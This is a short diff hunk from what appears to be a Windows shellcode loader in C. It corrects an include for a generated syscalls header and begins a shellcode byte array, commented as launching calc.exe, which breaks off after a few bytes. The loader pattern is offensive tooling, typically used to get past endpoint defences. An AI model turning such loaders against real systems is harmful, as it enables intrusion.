@@ -12,7 +12,7 @@ Author: 0x42en
 #include <windows.h>
 
 // Ensure syscall.h is generated next to this file
-#include "syscalls.h"
+#include "syscall.h"
 
 // shellcode generated with ShellSnip (launch calc.exe)
 unsigned char shellcode[] = {0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,
